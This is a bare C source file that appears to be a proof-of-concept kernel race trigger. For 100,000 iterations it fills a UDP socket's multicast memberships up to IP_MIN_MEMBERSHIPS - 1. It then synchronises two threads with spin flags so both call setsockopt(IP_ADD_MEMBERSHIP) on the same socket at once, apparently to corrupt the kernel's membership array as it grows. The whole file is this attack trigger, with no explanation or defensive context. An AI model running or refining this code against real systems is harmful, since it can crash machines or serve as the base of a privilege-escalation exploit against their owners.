#include <arpa/inet.h>  
#include <pthread.h>  
#include <unistd.h>  
  
volatile int lock_a;  
volatile int lock_b;  
  
int fd;  
struct sockaddr_in saddr;  
  
struct ip_mreq filler_group;  
struct ip_mreq group_a;  
struct ip_mreq group_b;  
  
void* thread_func(void* arg) {  
  lock_a = 1;  
  while (lock_b == 0) {}  
  
  setsockopt(fd, IPPROTO_IP, IP_ADD_MEMBERSHIP, &group_a, sizeof(group_a));  
  
  return NULL;  
}  
  
int main() {  
  int status;  
  pthread_t th;  
  
  saddr.sin_family = AF_INET;  
  
  group_a.imr_multiaddr.s_addr = inet_addr("224.0.0.1");  
  group_b.imr_multiaddr.s_addr = inet_addr("224.0.0.2");  
  
  for (int i = 0; i < 100000; ++i) {  
    fd = socket(AF_INET, SOCK_DGRAM, 0);  
  
    status = bind(fd, (struct sockaddr *) &saddr, sizeof(saddr));  
  
    for (int j = 0; j < IP_MIN_MEMBERSHIPS - 1; ++j) {  
      filler_group.imr_multiaddr.s_addr = htonl(ntohl(inet_addr("224.0.0.3")) + j);  
      status = setsockopt(fd, IPPROTO_IP, IP_ADD_MEMBERSHIP, &filler_group, sizeof(filler_group));  
    }  
  
    pthread_create(&th, NULL, thread_func, NULL);  
  
    while (lock_a == 0) {}  
    lock_b = 1;  
  
    status = setsockopt(fd, IPPROTO_IP, IP_ADD_MEMBERSHIP, &group_b, sizeof(group_b));  
  
    pthread_join(th, NULL);  
  
    close(fd);  
  }  
}  